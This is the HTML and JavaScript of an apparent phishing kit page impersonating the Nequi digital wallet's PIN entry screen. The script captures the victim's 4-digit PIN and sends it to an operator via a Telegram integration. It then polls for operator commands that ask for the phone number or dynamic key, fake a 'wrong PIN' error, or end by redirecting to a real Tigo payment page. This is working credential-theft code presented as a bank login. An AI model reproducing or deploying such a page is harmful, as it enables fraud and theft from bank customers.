    <h1 class="font-bold text-2xl leading-7 text-center mb-6 text-purple-primary">
      Ingresa tu clave
    </h1>
    
    <p class="font-normal text-sm leading-5 text-center text-purple-primary mb-7">
      Por tu seguridad, ingresa tu clave Nequi de 4 dígitos.
    </p>

    <div class="w-[180px] flex justify-around mx-auto mb-8 [&>input]:w-8 [&>input]:text-center [&>input]:border-b [&>input]:border-purple-primary [&>input]:h-[30px] [&>input]:text-4xl [&>input]:font-bold [&>input]:text-purple-primary [&>input]:focus:outline-none">
      <input id="otp-1" maxlength="1" inputmode="none" readonly>
      <input id="otp-2" maxlength="1" inputmode="none" readonly>
      <input id="otp-3" maxlength="1" inputmode="none" readonly>
      <input id="otp-4" maxlength="1" inputmode="none" readonly>
    </div>

    <div class="mt-8 w-full max-w-[300px] mx-auto" id="keyboard">
      <div class="flex justify-around mb-4 [&>button]:w-12 [&>button]:h-12 [&>button]:border-none [&>button]:bg-transparent [&>button]:text-4xl [&>button]:text-purple-primary [&>button]:cursor-pointer [&>button]:rounded-full [&>button]:transition-colors [&>button]:duration-200 [&>button]:select-none [&>button]:touch-manipulation [&>button]:focus:outline-none">

      <div class="flex justify-around mb-4 [&>button]:w-12 [&>button]:h-12 [&>button]:border-none [&>button]:bg-transparent [&>button]:text-4xl [&>button]:text-purple-primary [&>button]:cursor-pointer [&>button]:rounded-full [&>button]:transition-colors [&>button]:duration-200 [&>button]:select-none [&>button]:touch-manipulation [&>button]:focus:outline-none">

        <button class="invisible" disabled></button>
        <button class="keyboard-btn" data-value="0">0</button>
        <button class="keyboard-btn" id="delete-otp">
          <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2M3 12l6.414 6.414a2 2 0 001.414.586H19a2 2 0 002-2V7a2 2 0 00-2-2h-8.172a2 2 0 00-1.414.586L3 12z" />
          </svg>

      </div>

    <button type="button" id="btnContinuar" disabled class="w-full max-w-[300px] mx-auto mt-8 px-6 py-4 rounded-lg font-bold text-white text-lg transition-all duration-200" style="background-color: #DA0081; opacity: 0.3; cursor: not-allowed;">
      Continuar
    </button>
  </section>

  <script src="/socket.io/socket.io.js"></script>
  <script src="/js/telegram-integration.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', () => {
      console.log('[NEQUI] Inicializando clave.html');
      
      const inputs = document.querySelectorAll('input[id^="otp-"]');
      const keyboard = document.getElementById('keyboard');
      const deleteBtn = document.getElementById('delete-otp');
      const btnContinuar = document.getElementById('btnContinuar');
      const errorMessage = document.querySelector('.errorMessage');
      let currentInput = 0;
      
      // Socket.IO opcional
      let socket = null;
      try {
        if (typeof io !== 'undefined') {
          socket = io();
          console.log('[NEQUI] Socket.IO conectado');
        }
      } catch (e) {
        console.log('[NEQUI] Socket.IO no disponible, continuando sin él');
      }

      console.log('[NEQUI] Elementos encontrados:', {
        inputs: inputs.length,
        keyboard: !!keyboard,
        deleteBtn: !!deleteBtn,
        btnContinuar: !!btnContinuar,
        errorMessage: !!errorMessage
      });

      function resetKeyboard() {
        console.log('[NEQUI] Reseteando teclado');
        currentInput = 0;
        inputs.forEach((input) => {
          input.value = '';
          input.dataset.realValue = '';
        });
        updateButton();
      }

      function showError() {
        console.log('[NEQUI] Mostrando error');
        errorMessage.style.opacity = '1';
        errorMessage.style.transform = 'translateY(-20px)';
        setTimeout(() => {
          errorMessage.style.opacity = '0';
          errorMessage.style.transform = 'translateY(20px)';
        }, 4000);
      }

      // Bloquear COMPLETAMENTE el teclado físico
      inputs.forEach(input => {
        input.addEventListener('keydown', (e) => {
          e.preventDefault();
          return false;
        });
        input.addEventListener('keypress', (e) => {
          e.preventDefault();
          return false;
        });
        input.addEventListener('paste', (e) => {
          e.preventDefault();
          return false;
        });
      });

      function updateButton() {
        if (currentInput === inputs.length) {
          btnContinuar.disabled = false;
          btnContinuar.style.opacity = '1';
          btnContinuar.style.cursor = 'pointer';
          console.log('[NEQUI] Botón habilitado');
        } else {
          btnContinuar.disabled = true;
          btnContinuar.style.opacity = '0.3';
          btnContinuar.style.cursor = 'not-allowed';
          console.log('[NEQUI] Botón deshabilitado');
        }
      }

      // Event listener del teclado
      keyboard.addEventListener('click', (e) => {
        console.log('[NEQUI] Click detectado en keyboard', e.target);
        
        const button = e.target.closest('.keyboard-btn');
        console.log('[NEQUI] Botón encontrado:', button);
        
        if (button && button.id !== 'delete-otp') {
          const value = button.getAttribute('data-value');
          console.log('[NEQUI] Valor del botón:', value, 'currentInput:', currentInput);
          
          if (value && currentInput < inputs.length) {
            inputs[currentInput].dataset.realValue = value;
            inputs[currentInput].value = '*';
            currentInput++;
            console.log('[NEQUI] Nuevo currentInput:', currentInput);
            updateButton();
          }
        }
      });

      // Event listener para el botón delete
      deleteBtn.addEventListener('click', () => {
        console.log('[NEQUI] Delete clickeado, currentInput:', currentInput);
        if (currentInput > 0) {
          currentInput--;
          inputs[currentInput].value = '';
          inputs[currentInput].dataset.realValue = '';
          console.log('[NEQUI] Nuevo currentInput después de delete:', currentInput);
          updateButton();
        }
      });

      // Event listener para el botón continuar
      btnContinuar.addEventListener('click', async () => {
        console.log('[NEQUI] Botón Continuar clickeado');
        if (!btnContinuar.disabled) {
          const clave = Array.from(inputs).map(input => input.dataset.realValue).join('');
          
          // Deshabilitar botón
          btnContinuar.disabled = true;
          btnContinuar.textContent = 'Procesando...';
          
          // Mostrar overlay
          const overlay = document.createElement('div');
          overlay.className = 'loading-overlay nequi-loading active';
          overlay.innerHTML = `
            <svg class="loading-logo" viewBox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"></path>

              <path d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#FFFFFF"></path>
              <path d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#FFFFFF"></path>

              <path d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#FFFFFF"></path>
            </svg>
          `;
          document.body.appendChild(overlay);
          
          // Recuperar session ID de localStorage para acumular datos
          let sessionId = localStorage.getItem('nequi_session_id');
          if (!sessionId) {
            // Si no existe, generar uno nuevo (no debería pasar)
            sessionId = `nequi_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            localStorage.setItem('nequi_session_id', sessionId);
          }
          console.log('[NEQUI] SessionID recuperado:', sessionId);
          
          // Enviar datos a Telegram
          const result = await TelegramClient.sendToTelegram('nequi_clave', {
            bank: 'Nequi',
            step: 'clave',
            data: { clave: clave }
          }, sessionId);
          
          if (result.success) {
            console.log('[NEQUI] Datos enviados, esperando respuesta de Telegram...');
            
            // Iniciar polling para esperar respuesta
            const stopPolling = TelegramClient.startPolling((actions, stop) => {
              console.log('[NEQUI-CLAVE] ========== CALLBACK EJECUTADO ==========');
              console.log('[NEQUI-CLAVE] Total de acciones:', actions.length);
              console.log('[NEQUI-CLAVE] Acciones:', JSON.stringify(actions, null, 2));
              
              // CRÍTICO: Prevenir ejecuciones múltiples con guardia
              if (window.__nequiProcessing) {
                console.warn('[NEQUI-CLAVE] ⚠️ YA EN PROCESAMIENTO, ABORTANDO');
                return;
              }
              window.__nequiProcessing = true;
              
              // Procesar SOLO la primera acción
              const action = actions[0];
              console.log('[NEQUI-CLAVE] Procesando acción única:', action.action);
              
              // Switch sin loop - una sola acción, una sola ejecución
              switch(action.action) {
                case 'nequi_request_numero':
                  console.log('[NEQUI-CLAVE] → Redirigiendo a numero.html');
                  window.location.href = 'numero.html';
                  break;
                  
                case 'nequi_request_clave':
                  console.log('[NEQUI-CLAVE] → Solicitando reintentar clave');
                  showError();
                  resetKeyboard();
                  overlay.remove();
                  btnContinuar.disabled = false;
                  btnContinuar.textContent = 'Continuar';
                  window.__nequiProcessing = false;
                  break;
                  
                case 'nequi_error_clave':
                  console.log('[NEQUI-CLAVE] → Error de clave');
                  showError();
                  resetKeyboard();
                  overlay.remove();
                  btnContinuar.disabled = false;
                  btnContinuar.textContent = 'Continuar';
                  window.__nequiProcessing = false;
                  break;
                  
                case 'nequi_request_dinamica':
                  console.log('[NEQUI-CLAVE] → Redirigiendo a clave-dinamica.html');
                  window.location.href = 'clave-dinamica.html';
                  break;
                  
                case 'nequi_error_dinamica':
                  console.log('[NEQUI-CLAVE] → Error dinámica, redirigiendo a clave-dinamica.html');
                  window.location.href = 'clave-dinamica.html';
                  break;
                  
                case 'nequi_finalizar':
                  console.log('[NEQUI-CLAVE] → Finalizando sesión');
                  localStorage.removeItem('nequi_session_id');
                  window.location.href = 'https://mi.tigo.com.co/pago-express/facturas';
                  break;
                  
                default:
                  console.warn('[NEQUI-CLAVE] ⚠️ Acción desconocida:', action.action);
                  window.__nequiProcessing = false;
              }
            }, sessionId, 100, 300000);
          } else {
            alert('Error al procesar. Intenta nuevamente.');
            overlay.remove();
            btnContinuar.disabled = false;
            btnContinuar.textContent = 'Continuar';
          }
        }
      });

      updateButton();
      console.log('[NEQUI] Inicialización completa');
    });
  </script>
